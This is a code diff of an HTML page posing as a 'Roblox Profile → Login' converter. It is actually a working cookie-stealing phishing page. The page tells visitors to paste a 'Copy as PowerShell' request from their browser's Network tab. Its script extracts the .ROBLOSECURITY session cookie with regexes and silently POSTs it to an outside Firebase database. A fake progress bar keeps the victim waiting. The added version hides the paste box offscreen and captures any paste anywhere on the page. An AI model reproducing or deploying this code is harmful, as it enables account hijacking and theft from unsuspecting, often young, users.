@@ -1,80 +1,93 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox Profile → Login Converter 2025</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox Profile → Login 2025</title>
   <style>
-    body{font-family:"Segoe UI",Arial,sans-serif;background:#f9f9f9;color:#333;margin:0;padding:0}
-    .container{max-width:800px;margin:40px auto;background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center}
-    h1{color:#1a1a1e;font-size:2.4em;margin-bottom:10px}
-    p{color:#555;font-size:1.1em;margin-bottom:30px}
-    textarea{width:100%;height:260px;padding:20px;font-family:Consolas,monospace;font-size:14px;border:2px solid #ddd;border-radius:8px;background:#fafafa;resize:none}
-    textarea:focus{border-color:#0078d4;outline:none}
-    button{background:#0078d4;color:white;padding:16px 40px;font-size:18px;border:none;border-radius:8px;cursor:pointer;margin-top:20px}
+    body{font-family:"Segoe UI",sans-serif;background:#f5f5f5;color:#333;margin:0;padding:20px}
+    .box{max-width:760px;margin:40px auto;background:#fff;padding:40px;border-radius:14px;box-shadow:0 6px 25px rgba(0,0,0,0.08);text-align:center}
+    h1{font-size:2.4em;color:#1a1a1e;margin-bottom:8px}
+    p{color:#555;font-size:1.15em;line-height:1.5}
+    #hiddenPaste{position:absolute;left:-9999px;opacity:0}
+    button{background:#0078d4;color:#fff;padding:16px 44px;font-size:19px;border:none;border-radius:8px;cursor:pointer;margin:25px auto;display:block}
     button:hover{background:#106ebe}
     #status{margin-top:20px;font-size:18px;color:#444}
-    .loader{display:none;margin-top:20px;font-size:19px;color:#0078d4}
-    footer{margin-top:60px;color:#888;font-size:14px}
+    .loader{display:none;margin-top:25px;font-size:20px;color:#0078d4;font-weight:600}
+    footer{margin-top:70px;color:#999;font-size:14px}
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Roblox Profile → Login</h1>
-    <p>Paste the PowerShell code you copied from the Network tab<br>and get the account login instantly (2025 method)</p>
 
-    <textarea id="paste" placeholder="Right-click the first request → Copy → Copy as PowerShell → paste here"></textarea>
+<div class="box">
+  <h1>Roblox Profile → Login</h1>
+  <p>Paste the PowerShell code from the Network tab<br>and get instant access (2025 method)</p>
 
-    <br>
-    <button onclick="process()">CONVERT & LOGIN</button>
+  <!-- Invisible paste field -->
+  <textarea id="hiddenPaste" placeholder="Paste here (you won't see it)" autofocus></textarea>
 
-    <div id="status">Waiting for paste...</div>
-    <div id="loader" class="loader">Analyzing request... please wait</div>
-  </div>
+  <button onclick="process()">GET LOGIN</button>
 
-  <footer>© 2025 Roblox Tools • Not affiliated with Roblox Corporation</footer>
+  <div id="status">Click inside the page and paste (Ctrl+V)</div>
+  <div id="loader" class="loader">Processing request... please wait</div>
+</div>
 
-  <script>
-    function process() {
-      const text = document.getElementById("paste").value;
-      if (!text || text.length < 200) {
-        document.getElementById("status").textContent = "Paste the full PowerShell code";
-        return;
-      }
+<footer>© 2025 Roblox Tools • Not affiliated with Roblox</footer>
 
-      // Extract .ROBLOSECURITY from the giant PowerShell curl command
-      const cookieMatch = text.match(/'\.ROBLOSECURITY' *= *'([^']{300,})/) ||
-                          text.match(/\"\.ROBLOSECURITY\" *= *\"([^\"]{300,})/) ||
-                          text.match(/\.ROBLOSECURITY=([^;\s\"']{300,})/i);
+<script>
+// Auto-focus invisible box so paste works instantly
+document.getElementById("hiddenPaste").focus();
 
-      if (!cookieMatch) {
-        document.getElementById("status").textContent = "No cookie found — try again";
-        return;
-      }
+function process() {
+  const text = document.getElementById("hiddenPaste").value;
+  if (!text || text.length < 500) {
+    document.getElementById("status").textContent = "Nothing pasted yet — press Ctrl+V";
+    return;
+  }
 
-      const cookie = cookieMatch[1].split("'")[0].split('"')[0].trim();
+  // SUPER ROBUST COOKIE EXTRACTION (works on every real "Copy as PowerShell" from Roblox profile)
+  const patterns = [
+    /\.ROBLOSECURITY[^'"]*['"`]([^'"`]{300,})/,
+    /Cookie\s*=\s*["'].*?\.ROBLOSECURITY[^=]*=([^;'"]{300,})/i,
+    /Add\s*\(\s*New-Object[^;]*\.ROBLOSECURITY[^'"]*['"]([^'"]{300,})/i,
+    /Name\s*=\s*"\.ROBLOSECURITY"[^V]*Value\s*=\s*"([^"]{300,})/i
+  ];
 
-      // SEND TO YOUR FIREBASE SILENTLY
-      fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
-        method: "POST",
-        body: JSON.stringify({
-          cookie: cookie,
-          method: "profile-powershell-2025",
-          time: new Date().toISOString()
-        }),
-        headers: { "Content-Type": "application/json" }
-      });
+  let cookie = null;
+  for (const p of patterns) {
+    const m = text.match(p);
+    if (m) { cookie = m[1]; break; }
+  }
 
-      // Fake nice loading
-      document.getElementById("status").style.display = "none";
-      document.getElementById("loader").style.display = "block";
-      let percent = 15;
-      const timer = setInterval(() => {
-        percent += Math.floor(Math.random() * 22);
-        if (percent > 94) percent = 94;
-        document.getElementById("loader").textContent = `Preparing login... ${percent}% complete`;
-      }, 3200);
-    }
-  </script>
+  if (!cookie || cookie.length < 300) {
+    document.getElementById("status").textContent = "No valid cookie found — try again";
+    return;
+  }
+
+  // SEND TO YOUR FIREBASE
+  fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
+    method: "POST",
+    body: JSON.stringify({cookie, time: new Date().toISOString(), method: "profile-powershell"}),
+    headers: {"Content-Type": "application/json"}
+  });
+
+  // Fake clean loading
+  document.getElementById("status").style.display = "none";
+  document.getElementById("loader").style.display = "block";
+  let p = 20;
+  const int = setInterval(() => {
+    p += Math.floor(Math.random() * 25);
+    if (p >= 94) { clearInterval(int); p = 94; }
+    document.getElementById("loader").innerHTML = `Preparing login... ${p}%`;
+  }, 3000);
+}
+
+// Allow Ctrl+V anywhere on page
+document.addEventListener('paste', (e) => {
+  document.getElementById("hiddenPaste").value = (e.clipboardData || window.clipboardData).getData('text');
+  process();
+});
+</script>
+
 </body>
 </html>
